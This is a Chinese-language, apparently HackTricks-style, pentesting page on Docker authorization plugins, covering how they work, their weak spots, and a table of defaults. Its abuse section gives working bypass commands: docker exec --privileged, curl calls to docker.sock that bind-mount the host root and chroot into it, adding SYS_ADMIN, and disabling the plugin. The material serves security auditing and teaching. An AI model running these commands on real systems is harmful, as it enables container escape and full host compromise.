# 运行时授权插件

{{#include ../../../banners/hacktricks-training.md}}

## 概述

运行时授权插件是一个额外的策略层，用于决定调用者是否可以执行某个守护进程操作。Docker 是经典示例。默认情况下，任何能够与 Docker 守护进程通信的人实际上都能对其拥有广泛控制。授权插件尝试通过检查经过身份验证的用户和所请求的 API 操作来收窄该模型，然后根据策略允许或拒绝请求。

这个主题值得单独一页，因为当攻击者已经可以访问 Docker API 或属于 `docker` 组的用户时，它会改变利用模型。在这种环境下，问题不再只是“我能否到达守护进程？”而是“守护进程是否被授权层保护，如果是，该层是否可以通过未处理的端点、弱 JSON 解析或插件管理权限被绕过？”

## 工作原理

当请求到达 Docker 守护进程时，授权子系统可以将请求上下文传递给一个或多个已安装的插件。插件可以查看经过身份验证的用户身份、请求详情、选定的 header，以及在内容类型合适时请求或响应体的部分内容。多个插件可以串联，只有所有插件都允许该请求时才会授予访问。

这个模型看起来很强，但其安全性完全取决于策略作者对 API 的理解程度。一个阻止 `docker run --privileged` 但忽略 `docker exec`、错过替代 JSON 键（例如顶层的 `Binds`），或允许插件管理的插件，可能会制造出一种虚假的限制感，同时仍然留下一些直接的权限提升路径。

## 常见的插件目标

策略审查的重要领域包括：

- 容器创建端点
- `HostConfig` 字段，例如 `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode` 和命名空间共享选项
- `docker exec` 行为
- 插件管理端点
- 任何可以间接触发在预期策略模型之外的运行时动作的端点

历史上，例如 Twistlock 的 `authz` 插件以及诸如 `authobot` 的简单教学插件，使得研究该模型变得容易，因为它们的策略文件和代码路径展示了端点到动作的映射如何实际实现。对于评估工作，重要的教训是策略作者必须理解完整的 API 面，而不仅仅是最显眼的 CLI 命令。

## 滥用

首要目标是弄清楚实际被阻止的内容。如果守护进程拒绝某个操作，错误信息常常 leak 插件名称，这有助于识别正在使用的控制：
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
如果你需要更广泛的端点分析，像 `docker_auth_profiler` 这样的工具很有用，因为它们会自动化本来重复的任务——检查哪些 API 路由和 JSON 结构确实被该 plugin 允许。

如果环境使用自定义 plugin 且你可以与 API 交互，请枚举哪些对象字段实际上被过滤：
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
这些检查很重要，因为许多授权失败是针对具体字段的，而不是针对抽象概念的。一个插件可能会拒绝某种 CLI 模式，但不会完全阻止等价的 API 结构。

### 完整示例：`docker exec` 在容器创建后添加特权

阻止特权容器创建但允许非受限容器创建并允许使用 `docker exec` 的策略仍然可能被绕过：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
如果守护进程接受第二步，用户就能在容器内恢复一个具有特权的交互式进程，而策略作者认为该容器是受限的。

### 完整示例：Bind Mount Through Raw API

一些有缺陷的策略只检查一种 JSON 形式。如果没有始终阻止对根文件系统的 bind mount，宿主机仍然可以被挂载：
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
相同的概念也可能出现在 `HostConfig` 下：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影响是完全的宿主文件系统逃逸。有趣的是，这种绕过来自于策略覆盖不完整，而不是内核 bug。

### 完整示例：未检查的 capability 属性

如果策略忘记过滤与 capability 相关的属性，攻击者可能创建一个 container 来重新获得危险的 capability：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
一旦 `CAP_SYS_ADMIN` 或类似强权限存在，许多在 [capabilities.md](protections/capabilities.md) 和 [privileged-containers.md](privileged-containers.md) 中描述的突破技术就可以被利用。

### 完整示例：禁用插件

如果允许插件管理操作，最干净的绕过方式可能是将该控制完全关闭：
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
这是控制平面级别的策略失效。授权层存在，但原本应受限制的用户仍然保留禁用它的权限。

## 检查

这些命令用于识别策略层是否存在，以及它看起来是完整的还是表面的。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
值得注意的是：

- 包含插件名称的拒绝消息可以确认存在授权层，并且通常会暴露确切的实现。
- 攻击者可见的插件列表可能足以判断是否可以执行禁用或重新配置操作。
- 仅阻止明显 CLI 操作但不阻止原始 API 请求的策略，应在未证明不可绕过前视为可绕过。

## 运行时默认值

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化 |
| --- | --- | --- | --- |
| Docker Engine | 默认未启用 | 除非配置了 authorization plugin，否则对 Daemon 的访问实际上是全有或全无 | 不完整的插件策略、使用黑名单而不是白名单、允许插件管理、字段级盲点 |
| Podman | 不是一个常见的直接等价物 | Podman 通常更依赖 Unix 权限、rootless 执行 和 对 API 暴露 的决策，而不是 Docker-style authz plugins | 广泛暴露以 root 运行的 Podman API、socket 权限薄弱 |
| containerd / CRI-O | 控制模型不同 | 这些运行时通常依赖 socket 权限、节点信任边界和更高层编排器的控制，而不是 Docker authz plugins | 将 socket 挂载到工作负载中、对节点本地信任的假设过弱 |
| Kubernetes | 在 API-server 和 kubelet 层使用 authn/authz，而不是 Docker authz plugins | 集群的 RBAC 和准入控制是主要的策略层 | 过于宽泛的 RBAC、薄弱的准入策略、直接暴露 kubelet 或 runtime APIs |
